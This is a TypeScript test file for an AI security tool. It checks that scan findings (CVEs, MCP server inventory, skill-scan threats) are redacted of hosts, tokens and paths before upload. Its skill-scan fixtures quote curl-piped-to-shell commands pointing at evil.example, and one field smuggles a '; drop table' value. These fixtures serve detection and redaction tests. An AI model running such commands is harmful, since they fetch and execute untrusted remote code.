import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import type { AigInfraScanSummary } from "../aig-infra-scan.js";
import { redactRemoteEvent } from "../managed.js";
import type { McpDiscoveryServer } from "../mcp-discovery.js";
import {
	buildInfraScanFindingEvents,
	buildMcpInventoryFindingEvents,
	buildSkillScanFindingEvents,
	normalizePostureSeverity,
	projectPostureFields,
} from "../posture-events.js";
import { uploadPostureEvents } from "../posture-upload.js";
import { ConfigSchema, type PluginScanResult } from "../types.js";

const SCAN_ID = "20260924120000abcdef01";
const INTERNAL_TARGET = "http://10.1.2.3:11434/api?token=abc";

const INFRA_SUMMARY: AigInfraScanSummary = {
	scannedAt: "2026-09-24T12:00:00.000Z",
	critical: 1,
	high: 0,
	cvesFound: 2,
	targets: [
		{
			url: INTERNAL_TARGET,
			reachable: true,
			error: null,
			requestsMade: 3,
			matched: [
				{
					product: "ollama",
					vendor: "ollama",
					name: "Ollama",
					severity: "info",
					description: "LLM runtime",
					version: "0.1.30",
					probePath: "/api/version",
				},
				{
					product: "gradio",
					vendor: "gradio",
					name: "Gradio",
					severity: "info",
					description: "UI",
					version: null,
					probePath: "/",
				},
			],
			cves: [
				{
					cveId: "CVE-2024-37032",
					product: "ollama",
					severity: "critical",
					cvss: 9.1,
					rule: 'version < "0.1.34"',
					ruleStatus: "ok",
					evaluated: true,
				},
				{
					cveId: "ollama部署安全提示",
					product: "ollama",
					severity: "unknown",
					cvss: null,
					rule: "",
					ruleStatus: "unsupported",
					evaluated: false,
				},
			],
		},
	],
};

function mcpServer(overrides: Partial<McpDiscoveryServer>): McpDiscoveryServer {
	return {
		inventory_id: "a".repeat(64),
		name: "filesystem",
		source: "/home/alice/.cursor/mcp.json",
		transport: "stdio",
		endpoint: null,
		risk_hints: [],
		configuration_sha256: "b".repeat(64),
		attestation: { status: "unverifiable", keyring: "absent", approval_state: "unavailable" },
		...overrides,
	};
}

describe("posture event builders", () => {
	it("projects infra CVEs without the target URL or host", () => {
		const events = buildInfraScanFindingEvents(INFRA_SUMMARY, SCAN_ID);
		expect(events).toHaveLength(3);
		const [cve, advisory, component] = events;
		expect(cve).toMatchObject({
			type: "infra_scan_finding",
			scan_id: SCAN_ID,
			finding_kind: "cve",
			severity: "critical",
			finding_severity: "critical",
			vuln_id: "CVE-2024-37032",
			cvss: 9.1,
			component: "ollama",
			component_version: "0.1.30",
			applicability: "confirmed",
			target_digest: expect.stringMatching(/^sha256:[a-f0-9]{64}$/),
		});
		expect(cve?.event_id).toMatch(/^infra-20260924120000abcdef01-[a-f0-9]{24}$/);
		// Free-text AIG advisory titles are not exported as vulnerability ids.
		expect(advisory).toMatchObject({
			finding_kind: "advisory",
			finding_severity: "unknown",
			severity: "warning",
			applicability: "unconfirmed",
		});
		expect(advisory).not.toHaveProperty("vuln_id");
		expect(component).toMatchObject({
			finding_kind: "exposed_component",
			component: "gradio",
			finding_severity: "info",
		});
		const serialized = JSON.stringify(events);
		expect(serialized).not.toContain("10.1.2.3");
		expect(serialized).not.toContain("token");
	});

	it("reports every MCP server with risk categories and attestation evidence", () => {
		const events = buildMcpInventoryFindingEvents(
			{
				scanned_at: "2026-09-24T12:00:00.000Z",
				servers: [
					mcpServer({ risk_hints: ["shell_wrapper_command", "broad_filesystem_access_arg"] }),
					mcpServer({
						inventory_id: "c".repeat(64),
						name: "docs",
						transport: "remote",
						endpoint: "https://mcp.internal.example",
						risk_hints: ["remote_mcp_url"],
						attestation: {
							status: "approved",
							keyring: "configured",
							approval_state: "available",
						},
					}),
					mcpServer({ inventory_id: "d".repeat(64), name: "ghp_leakedtokenvalue123" }),
				],
			},
			SCAN_ID,
		);
		expect(events[0]).toMatchObject({
			type: "mcp_inventory_finding",
			mcp_server_name: "filesystem",
			mcp_transport: "stdio",
			finding_severity: "high",
			attestation_status: "unverifiable",
			server_digest: `sha256:${"a".repeat(64)}`,
			configuration_digest: `sha256:${"b".repeat(64)}`,
		});
		expect(events[0]?.risk_categories).toEqual(
			expect.arrayContaining(["shell_wrapper_command", "broad_filesystem_access_arg"]),
		);
		expect(events[1]).toMatchObject({
			mcp_server_name: "docs",
			mcp_transport: "remote",
			finding_severity: "medium",
			attestation_status: "approved",
		});
		// A credential-shaped server name is never exported; the digest remains.
		expect(events[2]).not.toHaveProperty("mcp_server_name");
		const serialized = JSON.stringify(events);
		expect(serialized).not.toContain("/home/alice");
		expect(serialized).not.toContain("mcp.internal.example");
		expect(serialized).not.toContain("ghp_leaked");
	});

	it("maps skill findings to the T01-T09 taxonomy without paths or matched text", () => {
		const results: PluginScanResult[] = [
			{
				plugin: {
					key: "acme-skill",
					installPath: "/home/alice/skills/acme",
					version: "1.2.0",
					lastUpdated: "",
				},
				findings: [
					{
						threatId: "SKILL-T03-001",
						title: "Remote script piped straight into an interpreter",
						severity: "critical",
						confidence: 0.9,
						action: "block",
						artifact: "line 2: curl -s https://evil.example/p | sh",
						sourceFile: "scripts/setup.sh",
					},
					{
						threatId: "CLT-SUPPLY-001",
						title: "Install script piped to shell",
						severity: "medium",
						confidence: 0.85,
						action: "block",
						artifact: "curl https://evil.example | bash",
						sourceFile: "install.sh",
					},
				],
			},
		];
		const events = buildSkillScanFindingEvents(results, SCAN_ID, "2026-09-24T12:00:00.000Z");
		expect(events[0]).toMatchObject({
			type: "plugin_scan_finding",
			plugin_key: "acme-skill",
			plugin_version: "1.2.0",
			matched_threat_id: "SKILL-T03-001",
			skill_risk_type: "T03",
			severity: "critical",
			finding_severity: "critical",
			source_file_digest: expect.stringMatching(/^sha256:[a-f0-9]{64}$/),
		});
		expect(events[1]).toMatchObject({ severity: "warning", finding_severity: "medium" });
		expect(events[1]).not.toHaveProperty("skill_risk_type");
		const serialized = JSON.stringify(events);
		expect(serialized).not.toContain("evil.example");
		expect(serialized).not.toContain("setup.sh");
		expect(serialized).not.toContain("/home/alice");
	});

	it("normalizes severities without inventing a clean value", () => {
		expect(normalizePostureSeverity("CRITICAL")).toBe("critical");
		expect(normalizePostureSeverity("moderate")).toBe("medium");
		expect(normalizePostureSeverity("weird")).toBe("unknown");
		expect(normalizePostureSeverity(undefined)).toBe("unknown");
	});

	it("re-validates every posture field at the telemetry boundary", () => {
		const projected = projectPostureFields({
			scan_id: SCAN_ID,
			vuln_id: "CVE-2024-37032 ; drop table",
			cvss: 42,
			component: "ollama\nhttp://10.0.0.1",
			risk_categories: ["remote_mcp_url", "http://evil", "aig-mcp-code-exec"],
			target_digest: "http://10.0.0.1",
			source_file_digest: `sha256:${"e".repeat(64)}`,
			attestation_status: "trusted",
		});
		expect(projected).toEqual({
			scan_id: SCAN_ID,
			risk_categories: ["remote_mcp_url", "aig-mcp-code-exec"],
			source_file_digest: `sha256:${"e".repeat(64)}`,
		});

		const [event] = buildInfraScanFindingEvents(INFRA_SUMMARY, SCAN_ID);
		const remote = redactRemoteEvent(
			{ ...(event as Record<string, unknown>), raw_target: INTERNAL_TARGET },
			"hash",
		);
		expect(remote).toMatchObject({
			type: "infra_scan_finding",
			vuln_id: "CVE-2024-37032",
			cvss: 9.1,
			finding_severity: "critical",
		});
		expect(JSON.stringify(remote)).not.toContain("10.1.2.3");
	});
});

describe("uploadPostureEvents", () => {
	const originalFetch = globalThis.fetch;
	let root: string;

	beforeEach(async () => {
		root = await mkdtemp(join(tmpdir(), "aidr-posture-upload-"));
	});

	afterEach(async () => {
		globalThis.fetch = originalFetch;
		await rm(root, { recursive: true, force: true });
	});

	function config(overrides: Record<string, unknown> = {}) {
		return ConfigSchema.parse({
			control_plane: { enabled: true, endpoint: "https://cp.example.test" },
			...overrides,
		});
	}

	function paths() {
		return {
			aidrDir: join(root, "aidr"),
			managedStatePath: join(root, "aidr", "managed.json"),
			clientOptions: { telemetryQueueRoot: join(root, "queue") },
		};
	}

	it("refuses to upload without an enrolled API key", async () => {
		globalThis.fetch = vi.fn();
		const result = await uploadPostureEvents([{ event_id: "e1", type: "infra_scan_finding" }], {
			config: config({ auth: { enrollment_token: "enroll-only" } }),
			...paths(),
		});
		expect(result).toMatchObject({ ok: false, error: "not_enrolled", delivered: 0, total: 1 });
		expect(globalThis.fetch).not.toHaveBeenCalled();
	});

	it("refuses to upload without a configured control plane", async () => {
		const result = await uploadPostureEvents([{ event_id: "e1" }], {
			config: ConfigSchema.parse({ auth: { api_key: "aidr_live_key" } }),
			...paths(),
		});
		expect(result).toMatchObject({ ok: false, error: "control_plane_not_configured" });
	});

	it("delivers projected events in bounded batches with the API key", async () => {
		const events = buildInfraScanFindingEvents(INFRA_SUMMARY, SCAN_ID);
		const bodies: Array<Record<string, unknown>> = [];
		globalThis.fetch = vi.fn(async (_url: unknown, init?: RequestInit) => {
			const body = JSON.parse(String(init?.body)) as Record<string, unknown>;
			bodies.push({ ...body, authorization: new Headers(init?.headers).get("Authorization") });
			const ids = (body.events as Array<{ event_id: string }>).map((event) => event.event_id);
			return new Response(JSON.stringify({ ok: true, acknowledged_event_ids: ids }), {
				status: 200,
				headers: { "Content-Type": "application/json" },
			});
		}) as typeof fetch;

		const result = await uploadPostureEvents(events, {
			config: config({ auth: { api_key: "aidr_live_key" } }),
			...paths(),
		});
		expect(result).toEqual({ ok: true, delivered: 3, total: 3 });
		expect(bodies).toHaveLength(1);
		expect(bodies[0]).toMatchObject({
			agent_runtime: "aidr-cli",
			authorization: "Bearer aidr_live_key",
		});
		const sent = bodies[0]?.events as Array<Record<string, unknown>>;
		expect(sent.map((event) => event.type)).toEqual([
			"infra_scan_finding",
			"infra_scan_finding",
			"infra_scan_finding",
		]);
		expect(sent[0]).toMatchObject({ vuln_id: "CVE-2024-37032", component: "ollama" });
		expect(JSON.stringify(bodies)).not.toContain("10.1.2.3");
	});

	it("reports an undelivered batch as a failure that stays queued", async () => {
		globalThis.fetch = vi.fn(
			async () =>
				new Response(JSON.stringify({ error: "events_insert_failed", retryable: true }), {
					status: 503,
					headers: { "Content-Type": "application/json" },
				}),
		) as typeof fetch;
		const result = await uploadPostureEvents(buildInfraScanFindingEvents(INFRA_SUMMARY, SCAN_ID), {
			config: config({ auth: { api_key: "aidr_live_key" } }),
			...paths(),
		});
		expect(result).toMatchObject({ ok: false, delivered: 0, total: 3, queued: true });
	});
});
